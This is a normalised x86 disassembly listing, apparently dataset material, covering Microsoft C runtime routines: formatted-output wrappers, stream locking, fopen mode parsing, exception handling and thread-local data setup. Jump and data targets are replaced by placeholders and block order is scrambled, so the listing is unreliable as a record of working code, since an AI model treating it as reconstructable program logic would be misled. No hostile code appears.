mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40c75f
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_40dae2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40ca3b
call sub_40da16
add esp 0x18
test eax eax
jge r-xdata
pop ebp
retn
or eax 0xffffffff
sub_40db0b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40ca3b
call sub_40da16
add esp 0x18
test eax eax
jge r-xdata
pop ebp
retn
or eax 0xffffffff
sub_40db35
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_4152e6
call sub_40da16
add esp 0x18
cmp eax ebx
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] bl
pop esi
call sub_40d7cc
mov [ eax ] 0x22
sub_40dbda
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
call sub_40d7cc
mov [ eax ] 0x16
jmp r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
call sub_40d7cc
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
cmp edi [ ebp + 0x10 ]
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax [ eax ]
push edi
push esi
push sub_4152e6
mov [ ebp - 0x4 ] eax
call sub_40da16
add esp 0x18
mov [ esi + edi - 0x1 ] bl
cmp eax 0xfffffffe
jne r-xdata
mov edi [ eax ]
mov eax [ ebp + 0x10 ]
inc eax
push eax
push esi
push sub_4152e6
call sub_40da16
add esp 0x18
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
cmp eax ebx
jge r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
call sub_40d7cc
cmp [ eax ] 0x22
jne r-xdata
mov [ esi ] bl
cmp eax 0xfffffffe
jne r-xdata
call sub_40d7cc
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_40d7cc
mov [ eax ] edi
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x22
call sub_40d7cc
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
jmp r-xdata
sub_40dce1
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40dbda
add esp 0x18
pop ebp
retn
sub_40dd01
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_413f80
call sub_40da16
add esp 0x18
test eax eax
jge r-xdata
pop ebp
retn
or eax 0xffffffff
sub_40dd2a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_413f80
call sub_40da16
add esp 0x18
test eax eax
jge r-xdata
pop ebp
retn
or eax 0xffffffff
sub_40dd5a
mov eax [ rwxdata ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_41348c
pop ecx
pop ecx
mov [ rwxdata ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rwxdata ] eax
xor edx edx
mov ecx rwxdata
jmp r-xdata
push 0x4
push esi
mov [ rwxdata ] esi
call sub_41348c
pop ecx
pop ecx
mov [ rwxdata ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rwxdata
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rwxdata ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rwxdata
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rwxdata
jl r-xdata
sub_40de2b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rwxdata
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rwxdata
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_4160e9
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_40de6c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_4160e9
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_40de9e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rwxdata
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rwxdata
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_415ff7
pop ecx
pop ebp
retn
sub_40deda
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_415ff7
pop ecx
pop ebp
retn
sub_40df09
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4169ef
add esp 0x14
test eax eax
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rwxdata ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_416dbe
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_416c3a
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_416c3a
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_416c3a
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_40e1d2
push 0x10
push r--data
call sub_40e30c
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rwxdata ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e301
mov eax edi
call sub_40e351
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_413447
pop ecx
mov ecx [ rwxdata ]
mov [ esi + ecx ] eax
mov eax [ rwxdata ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_416de7
pop ecx
pop ecx
test eax eax
mov eax [ rwxdata ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rwxdata ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_40fe78
pop ecx
mov eax [ rwxdata ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rwxdata ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
push esi
call sub_40de6c
pop ecx
pop ecx
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_416026
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_40deda
pop ecx
pop ecx
sub_40e30c
push sub_40e3a0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rwxdata ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_40e3a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rwxdata ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40b762
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40b762
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rwxdata
push edi
mov ecx ebx
call sub_40e668
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_40e61e
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40b762
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40b762
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_40e64e
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rwxdata
push edi
mov edx ebx
mov ecx eax
call sub_40e668
mov eax [ ebp + 0xc ]
push rwxdata
call sub_416ee0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40b762
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_40e635
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40b762
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rwxdata ]
add esp 0x8
sub_40e52c
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_40e5bc
push [ fs : 0x0 ]
mov eax [ rwxdata ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_4170b5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_4170d4
jmp r-xdata
sub_40e5bc
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40b762
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_40e52c
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40e61e
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40e64e
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40e699
mov edi edi
push ebp
mov ebp esp
push esi
push [ rwxdata ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_4109d2
pop ecx
test eax eax
je r-xdata
push eax
push [ rwxdata ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_40e714
mov edi edi
push ebp
mov ebp esp
push esi
push [ rwxdata ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_4109d2
pop ecx
test eax eax
je r-xdata
push eax
push [ rwxdata ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_40e7af
mov edi edi
push esi
push [ rwxdata ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rwxdata ]
call sub_40e714
pop ecx
mov esi eax
push esi
push [ rwxdata ]
call [ TlsSetValue@IAT ]
sub_40e800
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rwxdata ]
call sub_40e714
pop ecx
call eax
or [ rwxdata ] 0xffffffff
jmp sub_415fa0
push eax
call [ TlsFree@IAT ]
or [ rwxdata ] 0xffffffff
sub_40e83d
push 0xc
push r--data
call sub_40e30c
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_4109d2
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rwxdata
push 0xd
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e912
push 0xc
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_412297
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e91b
call sub_40e351
retn
mov eax [ rwxdata ]
mov [ esi + 0x6c ] eax
sub_40e924
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rwxdata ]
mov edi eax
call sub_40e7af
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_41348c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rwxdata ]
push [ rwxdata ]
call sub_40e714
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_40fe78
pop ecx
xor esi esi
push 0x0
push esi
call sub_40e83d
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_40e9b7
push 0x8
push r--data
call sub_40e30c
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40e351
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_40fe78
pop ecx
push 0xd
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_40fe78
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ead1
push 0xc
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40eadd
push esi
call sub_40fe78
pop ecx
push edi
call sub_412326
pop ecx
cmp edi [ rwxdata ]
je r-xdata
cmp edi rwxdata
je r-xdata
cmp edi rwxdata
je r-xdata
push edi
call sub_40fe78
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_41214e
pop ecx
sub_40eae6
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0xffffffff
je r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rwxdata ]
push [ rwxdata ]
call sub_40e714
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_40e9b7
push esi
push [ rwxdata ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rwxdata ]
push [ rwxdata ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_40eb60
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_4109d2
pop ecx
call sub_40e800
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rwxdata ] eax
call esi
push r--data
push edi
mov [ rwxdata ] eax
call esi
push r--data
push edi
mov [ rwxdata ] eax
call esi
cmp [ rwxdata ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rwxdata ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rwxdata ] eax
mov eax [ TlsFree@IAT ]
mov [ rwxdata ] sub_40e786
mov [ rwxdata ] esi
mov [ rwxdata ] eax
cmp [ rwxdata ] 0x0
je r-xdata
xor eax eax
push [ rwxdata ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
call sub_410d34
push [ rwxdata ]
call sub_40e699
push [ rwxdata ]
mov [ rwxdata ] eax
call sub_40e699
push [ rwxdata ]
mov [ rwxdata ] eax
call sub_40e699
push [ rwxdata ]
mov [ rwxdata ] eax
call sub_40e699
add esp 0x10
mov [ rwxdata ] eax
call sub_415f55
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_40e9b7
push [ rwxdata ]
call sub_40e714
pop ecx
call eax
mov [ rwxdata ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rwxdata ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_41348c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rwxdata ]
push [ rwxdata ]
call sub_40e714
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_40e83d
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_40eced
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_4173c0
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rwxdata ]
mov eax [ esi ]
